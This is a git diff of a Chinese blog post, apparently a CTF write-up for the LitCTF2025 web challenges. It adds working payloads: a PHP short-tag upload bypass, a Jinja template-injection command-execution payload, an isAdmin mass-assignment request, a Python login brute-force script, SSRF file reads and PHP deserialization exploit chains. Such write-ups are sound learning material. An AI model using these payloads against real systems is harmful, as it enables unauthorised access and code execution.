@@ -19,10 +19,12 @@
   <meta name="author" content="Xendr1a">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="LitCTF2025（公开赛道）（web 日期：2025-08-30 18:19:31 easy_file 首先是登入界面爆破发现账户密码是base64后的admin和password，进入界面看源码也能看到是对其经过处理的  来到上传界面上传，经过测试是过滤了&lt;?php,换成短标签&lt;?就可以  上传成功，然后就有一个很抽象的点，admin.php下是可以进行file参数任意文件读取的">
+<meta property="og:type" content="article">
 <meta property="og:title" content="LitCTF2025（公开赛道）（web">
-<meta property="og:url" content="https://xendr1a.github.io/2026/06/11/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/index.html">
+<meta property="og:url" content="https://xendr1a.github.io/2025/08/30/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/index.html">
 <meta property="og:site_name" content="Xendr1a的小窝">
+<meta property="og:description" content="LitCTF2025（公开赛道）（web 日期：2025-08-30 18:19:31 easy_file 首先是登入界面爆破发现账户密码是base64后的admin和password，进入界面看源码也能看到是对其经过处理的  来到上传界面上传，经过测试是过滤了&lt;?php,换成短标签&lt;?就可以  上传成功，然后就有一个很抽象的点，admin.php下是可以进行file参数任意文件读取的">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://xendr1a.github.io/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId20.png">
 <meta property="og:image" content="https://xendr1a.github.io/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId23.png">
@@ -43,8 +45,8 @@
 <meta property="og:image" content="https://xendr1a.github.io/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId72.png">
 <meta property="og:image" content="https://xendr1a.github.io/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId75.png">
 <meta property="og:image" content="https://xendr1a.github.io/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId81.png">
-<meta property="article:published_time" content="2026-06-11T03:02:01.000Z">
-<meta property="article:modified_time" content="2026-06-11T11:04:16.357Z">
+<meta property="article:published_time" content="2025-08-30T10:19:31.000Z">
+<meta property="article:modified_time" content="2026-06-11T11:13:16.460Z">
 <meta property="article:author" content="Xendr1a">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://xendr1a.github.io/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId20.png">
@@ -331,8 +333,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-06-11 11:02" pubdate>
-          2026年6月11日 上午
+        <time datetime="2025-08-30 18:19" pubdate>
+          2025年8月30日 晚上
         </time>
       </span>
     
@@ -343,7 +345,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          13k 字
         
       </span>
     
@@ -354,7 +356,7 @@
         
         
         
-          1 分钟
+          106 分钟
         
       </span>
     
@@ -398,25 +400,71 @@
             
               <div class="markdown-body">
                 
-                <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId20.png" alt="rId20.png"></p>
+                <p>LitCTF2025（公开赛道）（web</p>
+<p>日期：2025-08-30 18:19:31</p>
+<p>easy_file</p>
+<p>首先是登入界面爆破发现账户密码是base64后的admin和password，进入界面看源码也能看到是对其经过处理的</p>
+<p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId20.png" alt="rId20.png"></p>
+<p>来到上传界面上传，经过测试是过滤了&lt;?php,换成短标签&lt;?就可以</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId23.png" alt="rId23.png"></p>
+<p>上传成功，然后就有一个很抽象的点，admin.php下是可以进行file参数任意文件读取的（卡这半天，后面学长出了）后面就是大家都会的步骤了</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId26.png" alt="rId26.png"></p>
+<p>星愿信箱</p>
+<p>需要包含文字，过滤了&#123;&#123;吧，我们用&#123;%绕过了，没有回显我们就加print这样</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId30.png" alt="rId30.png"></p>
+<p>然后用的是</p>
+<p>&lt;code&gt;&#123;%print(lipsum.&lt;strong&gt;globals&lt;&#x2F;strong&gt;.&lt;strong&gt;builtins&lt;&#x2F;strong&gt;.&lt;strong&gt;import&lt;&#x2F;strong&gt;(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read())%}&lt;&#x2F;code&gt;</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId33.png" alt="rId33.png"></p>
+<p>nest_js</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId37.png" alt="rId37.png"></p>
+<p>账户密码admin passwor登入即送flag</p>
+<p>多重宇宙日记</p>
+<p>先随便创造个用户登入进去进入这个界面</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId41.png" alt="rId41.png"></p>
+<p>我们看他的源码</p>
+<p>&#x2F;&#x2F; 更新表单的JS提交        document.getElementById(&#39;profileUpdateForm&#39;).addEventListener(&#39;submit&#39;, async function(event) {            event.preventDefault();            const statusEl &#x3D; document.getElementById(&#39;updateStatus&#39;);            const currentSettingsEl &#x3D; document.getElementById(&#39;currentSettings&#39;);            statusEl.textContent &#x3D; &#39;正在更新…&#39;;            const formData &#x3D; new FormData(event.target);            const settingsPayload &#x3D; {};            &#x2F;&#x2F; 构建 settings 对象，只包含有值的字段            if (formData.get(&#39;theme&#39;)) settingsPayload.theme &#x3D; formData.get(&#39;theme&#39;);            if (formData.get(&#39;language&#39;)) settingsPayload.language &#x3D; formData.get(&#39;language&#39;);            &#x2F;&#x2F; …可以添加其他字段            try {                const response &#x3D; await fetch(&#39;&#x2F;api&#x2F;profile&#x2F;update&#39;, {                    method: &#39;POST&#39;,                    headers: {                        &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;,                    },                    body: JSON.stringify({ settings: settingsPayload }) &#x2F;&#x2F; 包装在 &quot;settings&quot;键下                });                const result &#x3D; await response.json();                if (response.ok) {                    statusEl.textContent &#x3D; &#39;成功: &#39; + result.message;                    currentSettingsEl.textContent &#x3D; JSON.stringify(result.settings, null, 2);                    &#x2F;&#x2F; 刷新页面以更新导航栏（如果isAdmin状态改变）                    setTimeout(() &#x3D;&gt; window.location.reload(), 1000);                } else {                    statusEl.textContent &#x3D; &#39;错误: &#39; + result.message;                }            } catch (error) {                statusEl.textContent &#x3D; &#39;请求失败: &#39; + error.toString();            }        });</p>
+<p>说明了需要让isAdmin&#x3D;ture,我们发送{ &quot;settings&quot;: { &quot;isAdmin&quot;: true } }获得管理员面板</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId44.png" alt="rId44.png"></p>
+<p>easy_signin</p>
+<p>界面是404，我们直接开扫</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId48.png" alt="rId48.png"></p>
+<p>分别是</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId51.png" alt="rId51.png"></p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId54.png" alt="rId54.png"></p>
+<p>源码有个api.js看看</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId57.png" alt="rId57.png"></p>
+<p>看见url第一反应就是127.0.0.1</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId60.png" alt="rId60.png"></p>
+<p>然后就卡住了，我们回到之前的登入界面看看他的逻辑，他给了</p>
+<p>const loginBtn &#x3D; document.getElementById(&#39;loginBtn&#39;);        const passwordInput &#x3D; document.getElementById(&#39;password&#39;);        const errorTip &#x3D; document.getElementById(&#39;errorTip&#39;);        const rawUsername &#x3D; document.getElementById(&#39;username&#39;).value;        loginBtn.addEventListener(&#39;click&#39;, async () &#x3D;&gt; {            const rawPassword &#x3D; passwordInput.value.trim();            if (!rawPassword) {                errorTip.textContent &#x3D; &#39;请输入密码&#39;;                errorTip.classList.add(&#39;show&#39;);                passwordInput.focus();                return;            }            const md5Username &#x3D; CryptoJS.MD5(rawUsername).toString();            const md5Password &#x3D; CryptoJS.MD5(rawPassword).toString();            const shortMd5User &#x3D; md5Username.slice(0, 6);            const shortMd5Pass &#x3D; md5Password.slice(0, 6);            const timestamp &#x3D; Date.now().toString(); &#x2F;&#x2F;五分钟            const secretKey &#x3D; &#39;easy_signin&#39;;            const sign &#x3D; CryptoJS.MD5(shortMd5User + shortMd5Pass + timestamp + secretKey).toString();            try {                const response &#x3D; await fetch(&#39;login.php&#39;, {                    method: &#39;POST&#39;,                    headers: {                        &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;,                        &#39;X-Sign&#39;: sign                    },                    body: new URLSearchParams({                        username: md5Username,                        password: md5Password,                        timestamp: timestamp                    })                });                const result &#x3D; await response.json();                if (result.code &#x3D;&#x3D;&#x3D; 200) {                    alert(&#39;登录成功！&#39;);                    window.location.href &#x3D; &#39;dashboard.php&#39;;                } else {                    errorTip.textContent &#x3D; result.msg;                    errorTip.classList.add(&#39;show&#39;);                    passwordInput.value &#x3D; &#39;&#39;;                    passwordInput.focus();                    setTimeout(() &#x3D;&gt; errorTip.classList.remove(&#39;show&#39;), 3000);                }            } catch (error) {                errorTip.textContent &#x3D; &#39;网络请求失败&#39;;                errorTip.classList.add(&#39;show&#39;);                setTimeout(() &#x3D;&gt; errorTip.classList.remove(&#39;show&#39;), 3000);            }        });        passwordInput.addEventListener(&#39;input&#39;, () &#x3D;&gt; {            errorTip.classList.remove(&#39;show&#39;);        });</p>
+<p>通过这个我们可以知道他的密码的生成逻辑，直接叫ai搓一个</p>
+<p>import requestsimport hashlibimport time# 配置参数username &#x3D; &#39;admin&#39;  # 假设用户名已知，如果不同请修改password_file &#x3D; &#39;&#39;  # 密码字典文件路径url &#x3D; &#39;&#39;  # 登录URL，请替换为实际URL# 计算用户名的MD5（固定值）md5_user &#x3D; hashlib.md5(username.encode()).hexdigest()# 读取密码字典try:    with open(password_file, &#39;r&#39;) as f:        passwords &#x3D; [line.strip() for line in f.readlines()]except FileNotFoundError:    print(f&quot;密码文件 {password_file} 未找到&quot;)    exit(1)# 遍历密码字典for password in passwords:    # 计算密码的MD5    md5_pass &#x3D; hashlib.md5(password.encode()).hexdigest()    short_user &#x3D; md5_user[:6]    short_pass &#x3D; md5_pass[:6]    timestamp &#x3D; str(int(time.time() * 1000))  # 当前毫秒时间戳    sign_str &#x3D; short_user + short_pass + timestamp + &#39;easy_signin&#39;    sign &#x3D; hashlib.md5(sign_str.encode()).hexdigest()    # 构造请求头和数据    headers &#x3D; {        &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;,        &#39;X-Sign&#39;: sign    }    data &#x3D; {        &#39;username&#39;: md5_user,        &#39;password&#39;: md5_pass,        &#39;timestamp&#39;: timestamp    }    # 发送POST请求    try:        response &#x3D; requests.post(url, headers&#x3D;headers, data&#x3D;data, timeout&#x3D;5)        # 检查响应状态码和内容        if response.status_code &#x3D;&#x3D; 200:            # 假设成功响应中包含&quot;success&quot;关键字，根据实际响应调整            if &#39;success&#39; in response.text.lower():                print(f&quot;[+] 找到密码: {password}&quot;)                break            else:                print(f&quot;[-] 尝试密码: {password} 失败，响应: {response.text}&quot;)        else:            print(f&quot;[-] 尝试密码: {password} 失败，状态码: {response.status_code}&quot;)    except requests.exceptions.RequestException as e:        print(f&quot;[-] 请求异常 for password: {password}, error: {e}&quot;)    # 可选：添加延迟避免请求过快    # time.sleep(0.1)print(&quot;爆破完成&quot;)</p>
+<p>爆破出来是密码是admin123，依旧是让ai搓个登入后访问&#x2F;dashboard.php</p>
+<p>import requestsimport hashlibimport timeimport json# 配置参数username &#x3D; &#39;admin&#39;  # 假设用户名为 &#39;admin&#39;，如果不是请修改password &#x3D; &#39;admin123&#39;  # 已知的正确密码login_url &#x3D; &#39;<a target="_blank" rel="noopener" href="http://node6.anna.nssctf.cn:20560/login.php&#39">http://node6.anna.nssctf.cn:20560/login.php&amp;#39</a>;  # 请替换为实际的登录URLdashboard_url &#x3D; &#39;<a target="_blank" rel="noopener" href="http://node6.anna.nssctf.cn:20560/dashboard.php&#39">http://node6.anna.nssctf.cn:20560/dashboard.php&amp;#39</a>;  # 请替换为实际的dashboard URL# 创建一个会话对象来保持cookiessession &#x3D; requests.Session()# 计算用户名的MD5md5_user &#x3D; hashlib.md5(username.encode()).hexdigest()print(f&quot;用户 &#39;{username}&#39; 的MD5: {md5_user}&quot;)# 计算密码的MD5md5_pass &#x3D; hashlib.md5(password.encode()).hexdigest()print(f&quot;密码 &#39;{password}&#39; 的MD5: {md5_pass}&quot;)# 截取前6位short_user &#x3D; md5_user[:6]short_pass &#x3D; md5_pass[:6]print(f&quot;用户名MD5前6位: {short_user}&quot;)print(f&quot;密码MD5前6位: {short_pass}&quot;)# 生成时间戳（毫秒）timestamp &#x3D; str(int(time.time() * 1000))print(f&quot;时间戳: {timestamp}&quot;)# 计算签名secret_key &#x3D; &#39;easy_signin&#39;sign_str &#x3D; short_user + short_pass + timestamp + secret_keysign &#x3D; hashlib.md5(sign_str.encode()).hexdigest()print(f&quot;签名字符串: {sign_str}&quot;)print(f&quot;签名MD5: {sign}&quot;)# 构造登录请求头和数据headers &#x3D; {    &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;,    &#39;X-Sign&#39;: sign,    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.124 Safari&#x2F;537.36&#39;}data &#x3D; {    &#39;username&#39;: md5_user,    &#39;password&#39;: md5_pass,    &#39;timestamp&#39;: timestamp}print(&quot;\n&quot; + &quot;&#x3D;&quot; * 50)print(&quot;发送登录请求…&quot;)print(&quot;&#x3D;&quot; * 50)# 发送登录POST请求try:    login_response &#x3D; session.post(login_url, headers&#x3D;headers, data&#x3D;data)    print(f&quot;登录请求URL: {login_url}&quot;)    print(f&quot;请求方法: POST&quot;)    print(&quot;\n登录请求头:&quot;)    for key, value in headers.items():        print(f&quot;  {key}: {value}&quot;)    print(&quot;\n登录请求体:&quot;)    print(f&quot;  {data}&quot;)    print(&quot;\n&quot; + &quot;-&quot; * 50)    print(f&quot;登录响应状态码: {login_response.status_code}&quot;)    print(f&quot;登录响应时间: {login_response.elapsed.total_seconds():.2f}秒&quot;)    print(&quot;\n登录响应头:&quot;)    for key, value in login_response.headers.items():        print(f&quot;  {key}: {value}&quot;)    print(&quot;\n登录响应内容:&quot;)    # 尝试解析JSON响应，如果不是JSON则直接显示文本    try:        json_response &#x3D; login_response.json()        print(json.dumps(json_response, indent&#x3D;2, ensure_ascii&#x3D;False))    except ValueError:        print(login_response.text)    print(&quot;\n当前会话Cookies:&quot;)    for cookie in session.cookies:        print(f&quot;  {cookie.name}: {cookie.value}&quot;)    print(&quot;\n&quot; + &quot;&#x3D;&quot; * 50)    if login_response.status_code &#x3D;&#x3D; 200:        print(&quot;[+] 登录请求发送成功!&quot;)        # 这里可以根据实际响应内容判断是否登录成功        if &#39;success&#39; in login_response.text.lower() or &#39;登录成功&#39; in login_response.text:            print(&quot;[+] 登录成功!&quot;)        else:            print(&quot;[-] 登录可能失败，请检查响应内容&quot;)    else:        print(f&quot;[-] 登录请求失败，状态码: {login_response.status_code}&quot;)except requests.exceptions.RequestException as e:    print(f&quot;[-] 登录请求异常: {e}&quot;)    print(f&quot;异常详情: {str(e)}&quot;)    exit(1)# 访问 dashboard.phpprint(&quot;\n\n&quot; + &quot;&#x3D;&quot; * 50)print(&quot;访问 Dashboard…&quot;)print(&quot;&#x3D;&quot; * 50)try:    dashboard_response &#x3D; session.get(dashboard_url)    print(f&quot;Dashboard请求URL: {dashboard_url}&quot;)    print(f&quot;请求方法: GET&quot;)    print(&quot;\nDashboard请求头:&quot;)    # 显示发送到dashboard的请求头    dashboard_headers &#x3D; {        &#39;User-Agent&#39;: headers[&#39;User-Agent&#39;]    }    for key, value in dashboard_headers.items():        print(f&quot;  {key}: {value}&quot;)    print(&quot;\n&quot; + &quot;-&quot; * 50)    print(f&quot;Dashboard响应状态码: {dashboard_response.status_code}&quot;)    print(f&quot;Dashboard响应时间: {dashboard_response.elapsed.total_seconds():.2f}秒&quot;)    print(&quot;\nDashboard响应头:&quot;)    for key, value in dashboard_response.headers.items():        print(f&quot;  {key}: {value}&quot;)    print(&quot;\nDashboard响应内容:&quot;)    # 尝试解析JSON响应，如果不是JSON则直接显示文本    try:        json_response &#x3D; dashboard_response.json()        print(json.dumps(json_response, indent&#x3D;2, ensure_ascii&#x3D;False))    except ValueError:        # 如果是HTML，只显示前1000字符，避免控制台输出过多        content &#x3D; dashboard_response.text        if len(content) &gt; 1000:            print(content[:1000] + &quot;…\n[内容过长，已截断]&quot;)        else:            print(content)    print(&quot;\n&quot; + &quot;&#x3D;&quot; * 50)    if dashboard_response.status_code &#x3D;&#x3D; 200:        print(&quot;[+] Dashboard访问成功!&quot;)    else:        print(f&quot;[-] Dashboard访问失败，状态码: {dashboard_response.status_code}&quot;)except requests.exceptions.RequestException as e:    print(f&quot;[-] Dashboard请求异常: {e}&quot;)    print(f&quot;异常详情: {str(e)}&quot;)</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId63.png" alt="rId63.png"></p>
+<p>我们利用那个url参数打ssrf</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId66.png" alt="rId66.png"></p>
+<p>这里可以用ls &#x2F;var&#x2F;www&#x2F;html来找需要用二次编码（应该是快照和网页的两次解码），我们发现了327a6c4304ad5938eaf0efb6cc3e53dc.php</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId69.png" alt="rId69.png"></p>
+<p>访问得flag</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId72.png" alt="rId72.png"></p>
+<p>还有一种方法说url参数那是能用php:&#x2F;&#x2F;(php大小写混用绕过即可)或者file:&#x2F;&#x2F;来读取源码或者urlcode.php的内容（没有去特意去看了)</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId75.png" alt="rId75.png"></p>
+<p>君の名は</p>
+<p>参考自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Litsasuk/articles/18896993">https://www.cnblogs.com/Litsasuk/articles/18896993</a></p>
+<p>&lt;?phphighlight_file(<strong>FILE</strong>);error_reporting(0);create_function(&quot;&quot;, &#39;die(<code>/readflag</code>);&#39;);class Taki{    private $musubi;    private $magic;    public function __unserialize(array $data)    {        $this-&gt;musubi &#x3D; $data[&#39;musubi&#39;];        $this-&gt;magic &#x3D; $data[&#39;magic&#39;];        return ($this-&gt;musubi)();    }    public function __call($func,$args){        (new $args<a href="$args%5B1%5D">0</a>)-&gt;{$this-&gt;magic}();    }}class Mitsuha{    private $memory;    private $thread;    public function __invoke()    {        return $this-&gt;memory.$this-&gt;thread;    }}class KatawareDoki{    private $soul;    private $kuchikamizake;    private $name;    public function __toString()    {        ($this-&gt;soul)-&gt;flag($this-&gt;kuchikamizake,$this-&gt;name);        return &quot;call error!no flag!&quot;;    }}$Litctf2025 &#x3D; $_POST[&#39;Litctf2025&#39;];if(!preg_match(&quot;&#x2F;^[Oa]:[\d]+&#x2F;i&quot;, $Litctf2025)){    unserialize($Litctf2025);}else{    echo &quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;;}</p>
+<p>我们的主要目的应该就是create_function(&quot;&quot;, &#39;die(&#x2F;readflag);&#39;);，create_function()是用来创建匿名函数的，看到把O改成C很容易想到原生类<a target="_blank" rel="noopener" href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3">https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3</a></p>
+<p>ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize</p>
+<p>那思路应该就是利用原生类来调用匿名函数，找到ReflectionFunction的invoke方法可以调用函数</p>
 <p><img src="/img/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/rId81.png" alt="rId81.png"></p>
+<p>但是匿名函数怎么弄呢，可以直接用</p>
+<p>&lt;?php$a&#x3D;create_function(&quot;&quot;, &#39;die(<code>/readflag</code>);&#39;);var_dump(   $a);#string(9) &quot;\000lambda_1&quot;</p>
+<p>\000lambda_1这个就是名字了，但是匿名函数的函数名是会改变的，在web页面中打开php文件，每刷新一次函数名的数字就会加一，最好是重新开一下环境</p>
+<p>Litsasuk师傅的exp&lt;?phphighlight_file(<strong>FILE</strong>);error_reporting(0);class Taki{    public $musubi;    public $magic &#x3D; &quot;invoke&quot;;}class Mitsuha{    public $memory;    public $thread;}class KatawareDoki{    public $soul;    public $kuchikamizake &#x3D; &quot;ReflectionFunction&quot;;    public $name &#x3D; &quot;\000lambda_1&quot;;}$a &#x3D; new Taki();$b &#x3D; new Mitsuha();$c &#x3D; new KatawareDoki();$a-&gt;musubi &#x3D; $b;     &#x2F;&#x2F; 1.把对象当成函数调用，触发__invoke()$b-&gt;thread &#x3D; $c;     &#x2F;&#x2F; 2. 把对象作为字符串使用，触发__toString()$c-&gt;soul &#x3D; $a;           &#x2F;&#x2F; 3. 调用不存在的方法，触发__call()$arr&#x3D;array(&quot;evil&quot;&#x3D;&gt;$a);$d&#x3D;new ArrayObject($arr);echo urlencode(serialize($d));</p>
+<p>还有一个非预期，直接在return ($this-&gt;musubi)();处调用匿名函数</p>
+<p>&lt;?phphighlight_file(<strong>FILE</strong>);error_reporting(0);class Taki{    public $musubi &#x3D; &quot;\000lambda_1&quot;;    public $magic &#x3D; &quot;&quot;;}$a &#x3D; new Taki();$arr&#x3D;array(&quot;evil&quot;&#x3D;&gt;$a);$d&#x3D;new ArrayObject($arr);echo urlencode(serialize($d));</p>
+<p>总结</p>
+<p>拖那么久才想起来复现，easy_signineasy_signin比赛时候没出来有点可惜，这题反序列化的话其实现在还是有点迷迷糊糊（本来基础不扎实），加油吧！官方wp<a target="_blank" rel="noopener" href="https://godyu.com/13917.html">https://godyu.com/13917.html</a></p>
 
                 
               </div>
@@ -435,7 +483,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>LitCTF2025（公开赛道）（web</div>
-      <div>https://xendr1a.github.io/2026/06/11/LitCTF2025-公开赛道-web/</div>
+      <div>https://xendr1a.github.io/2025/08/30/LitCTF2025-公开赛道-web/</div>
     </div>
     <div class="license-meta">
       
@@ -447,7 +495,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年6月11日</div>
+          <div>2025年8月30日</div>
         </div>
       
       
@@ -479,12 +527,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2025/09/02/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/" title="关于php反序列化的魔术方法的调用">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">关于php反序列化的魔术方法的调用</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/06/11/2025H-NCTF-web/" title="2025H&amp;NCTF web">
-                        <span class="hidden-mobile">2025H&amp;NCTF web</span>
+                      <a href="/2025/07/31/hexo_with_ctfshow_post/" title="复现 ctfshow 每周大挑战(RCE极限挑战)">
+                        <span class="hidden-mobile">复现 ctfshow 每周大挑战(RCE极限挑战)</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
